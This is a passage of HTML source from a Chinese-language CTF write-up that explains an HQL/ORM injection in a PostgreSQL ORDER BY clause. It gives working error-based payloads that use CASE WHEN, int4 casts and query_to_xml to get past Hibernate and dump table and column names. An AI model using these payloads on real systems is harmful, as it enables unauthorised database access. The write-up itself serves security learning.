+&lt;p&gt;測試了一下並根據錯誤訊息，發現後台使用的 DBMS 為 PostgreSQL，並且使用 Hibernate 的 ORM 框架。而查詢的 Query 格式如下，其中 &lt;strong&gt;{{ INJECTABLE }}&lt;/strong&gt; 即為注入點：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;c&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;from&lt;/span&gt; solutions.bloodsuckers.models.Criminal &lt;span style="color:#66d9ef"&gt;c&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;WHERE&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; (&lt;span style="color:#66d9ef"&gt;c&lt;/span&gt;.name &lt;span style="color:#66d9ef"&gt;like&lt;/span&gt; :pName &lt;span style="color:#66d9ef"&gt;or&lt;/span&gt; :pNameLength &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;) &lt;span style="color:#66d9ef"&gt;and&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; (&lt;span style="color:#66d9ef"&gt;c&lt;/span&gt;.age &lt;span style="color:#f92672"&gt;=&lt;/span&gt; :pAge &lt;span style="color:#66d9ef"&gt;or&lt;/span&gt; :pAge &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;) &lt;span style="color:#66d9ef"&gt;and&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; (&lt;span style="color:#66d9ef"&gt;c&lt;/span&gt;.crime &lt;span style="color:#66d9ef"&gt;like&lt;/span&gt; :pCrime &lt;span style="color:#66d9ef"&gt;or&lt;/span&gt; :pCrimeLength &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;order&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;by&lt;/span&gt; &lt;span style="color:#960050;background-color:#1e0010"&gt;{{&lt;/span&gt; INJECTABLE &lt;span style="color:#960050;background-color:#1e0010"&gt;}}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;接著就是我開始進入各種鬼打牆的時候 ( T д T )&lt;/p&gt;
+&lt;p&gt;根據 PostgreSQL 的官方文件，UNION 和 MySQL 一樣必須在 ORDER BY 之前，因此無法直接 dump 資料：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2017/10/pwn2win-ctf-2017-write-up-web-criminals-3.png" alt="" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;於是我很單純 (根本是單蠢T__T) 的認為，該將重點放在搭配 SELECT 子查詢觸發 Error-Based Injection，而文件表示可以在 ORDER BY 上使用 expression，所以就先嘗試直接塞 SELECT，但似乎是 Hibernate 不讓我過 (?&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2017/10/pwn2win-ctf-2017-write-up-web-criminals-4.png" alt="" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;繼續爬了一些官方文件，發現可以在 ORDER BY 上使用 CASE WHEN 敘述句，再搭配一些測試，好像順利通過 Hibernate ，成功讓 PostgreSQL 執行，此時的 Payload 為：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;case&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;when&lt;/span&gt; (
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;select&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;current_user&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;from&lt;/span&gt; solutions.bloodsuckers.models.Criminal
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;)&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;then&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;end&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;desc&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2017/10/pwn2win-ctf-2017-write-up-web-criminals-5.png" alt="" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;緊接著利用 CAST( &amp;hellip; AS type ) 的子句觸發轉型錯誤的 Error，讓資料噴出來，順利獲得 DB 的使用者&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2017/10/pwn2win-ctf-2017-write-up-web-criminals-6.png" alt="" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;偷懶直接使用網上的 Cheat Sheet 中的 Payload，想將 table dump 出來&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;CASE&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;WHEN&lt;/span&gt; (
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;SELECT&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;CAST&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;c&lt;/span&gt;.relname &lt;span style="color:#66d9ef"&gt;AS&lt;/span&gt; int)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;FROM&lt;/span&gt; pg_catalog.pg_class &lt;span style="color:#66d9ef"&gt;c&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;LEFT&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;JOIN&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; pg_catalog.pg_namespace n &lt;span style="color:#66d9ef"&gt;ON&lt;/span&gt; n.oid &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;c&lt;/span&gt;.relnamespace
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;WHERE&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;c&lt;/span&gt;.relkind &lt;span style="color:#66d9ef"&gt;IN&lt;/span&gt; (&lt;span style="color:#e6db74"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;) &lt;span style="color:#66d9ef"&gt;AND&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; n.nspname &lt;span style="color:#66d9ef"&gt;NOT&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;IN&lt;/span&gt; (&lt;span style="color:#e6db74"&gt;&amp;#39;pg_catalog&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;pg_toast&amp;#39;&lt;/span&gt;) &lt;span style="color:#66d9ef"&gt;AND&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; pg_catalog.pg_table_is_visible(&lt;span style="color:#66d9ef"&gt;c&lt;/span&gt;.oid)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;)&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;THEN&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;ELSE&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;END&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;DESC&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;結果卻噴出這個錯誤訊息 Σ(T□T)&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2017/10/pwn2win-ctf-2017-write-up-web-criminals-7.png" alt="" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;原來是因為 Query 中的 table 不是真實的 table，Hibernate 會將其再映射到資料庫中真實的 table，此 Query 似乎也不是普通的 SQL，是一種包裝過的 HQL。&lt;/p&gt;
+&lt;p&gt;於是我就踏上尋找如何繞過 Hibernate 限制的方法的旅途，但一直沒有搜尋到最重要的關鍵字，導致遲遲沒有結果。想嘗試將 Query 包成字串再讓其動態執行，但所爬到的資料都是利用建立自定義 function，再以 EXECUTE &amp;hellip; USING &amp;hellip; 敘述句來將字串作為 Query 執行，但在這題完全派不上用場 QQ。&lt;/p&gt;
+&lt;p&gt;比賽期間因為恰好有事沒有辦法解題，所以當在解這道題目時比賽也早已結束，而搜尋了數十篇文章資料都沒有結果，在無計可施的情況下，只好豁出去求助某位大神能否指引方向，那位大神看到後果然秒回我一個可以參考的簡報資料：&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.slideshare.net/0ang3el/new-methods-for-exploiting-orm-injections-in-java-applications"target="_blank" rel="noopener"&gt;New methods for exploiting ORM injections in Java applications by Mikhail Egorov and Sergey Soldatov&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;其中最關鍵的是 query_to_xml 這個函式，正是可以將某字串作為 Query 執行並將結果轉成 xml 回傳的神器！&lt;/p&gt;
+&lt;p&gt;於是就重新構造了這麼一段 Payload：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;CAST&lt;/span&gt;(
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; array_to_string(
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; xpath(&lt;span style="color:#e6db74"&gt;&amp;#39;row[1]&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; query_to_xml(&lt;span style="color:#e6db74"&gt;&amp;#39;select current_user&amp;#39;&lt;/span&gt;,&lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;,&lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; )
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ,&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;AS&lt;/span&gt; int)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;正當以為能順利運行時&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2017/10/pwn2win-ctf-2017-write-up-web-criminals-8.png" alt="" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;又是 Hibernate 呀 (╯▔□▔)╯ ~╩╩&lt;/p&gt;
+&lt;p&gt;試著修改一下，加上「 chr(95) || 」看能不能通過&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;CAST&lt;/span&gt;(
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; (chr(&lt;span style="color:#ae81ff"&gt;95&lt;/span&gt;) &lt;span style="color:#f92672"&gt;||&lt;/span&gt; array_to_string(
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; xpath(&lt;span style="color:#e6db74"&gt;&amp;#39;row[1]&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; query_to_xml(&lt;span style="color:#e6db74"&gt;&amp;#39;select current_user&amp;#39;&lt;/span&gt;,&lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;,&lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; )
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ,&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;))
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;AS&lt;/span&gt; int)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2017/10/pwn2win-ctf-2017-write-up-web-criminals-9.png" alt="" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;WHYYYYYY，雖然過了 Hibernate ，但 query_to_xml 的所有參數被強制作字串 concatenate。&lt;/p&gt;
+&lt;p&gt;只好繼續在網路上和文件中尋覓有用的敘述句，直到在 StackOverflow 上某篇討論 PostgreSQL 開發相關問題的文章中發現到，除了 CAST 以外，也能嘗試使用 int4 來將字串轉換成數字，於是就修改 Payload 為：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;int4(
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; array_to_string(
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; xpath(&lt;span style="color:#e6db74"&gt;&amp;#39;row[1]&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; query_to_xml(&lt;span style="color:#e6db74"&gt;&amp;#39;select current_user&amp;#39;&lt;/span&gt;,&lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;,&lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; )
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ,&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;此時已經心力交瘁，邊祈禱著能夠順利邊按下送出&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://cyku.tw/images/2017/10/pwn2win-ctf-2017-write-up-web-criminals-10.png" alt="" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;此時我的心情大概就像這個樣子：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://i.imgur.com/MqxvU42.gif" alt="" data-zoomable loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;搭配 Cheat Sheet 的 Payload，將 table 與 column 都抓出來：&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;int4(
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; array_to_string(
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; xpath(&lt;span style="color:#e6db74"&gt;&amp;#39;row[1]&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; query_to_xml(
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (&amp;#39;&amp;#39;r&amp;#39;&amp;#39;,&amp;#39;&amp;#39;&amp;#39;&amp;#39;) AND n.nspname NOT IN (&amp;#39;&amp;#39;pg_catalog&amp;#39;&amp;#39;, &amp;#39;&amp;#39;pg_toast&amp;#39;&amp;#39;) AND pg_catalog.pg_table_is_visible(c.oid)&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; )
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; )
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ,&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="複製程式碼"
+aria-label="複製程式碼"
+data-copied-label="已複製！"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;int4(
+array_to_string(
+xpath(&amp;#39;row[1]&amp;#39;,
+query_to_xml(
+&amp;#39;SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=&amp;#39;&amp;#39;r&amp;#39;&amp;#39;) AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum&amp;gt;0) AND (NOT A.attisdropped) AND (N.nspname ILIKE &amp;#39;&amp;#39;public&amp;#39;&amp;#39;)&amp;#39;,
+true,
+false,
+&amp;#39;&amp;#39;
+)
+)
+,&amp;#39;&amp;#39;)
+)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
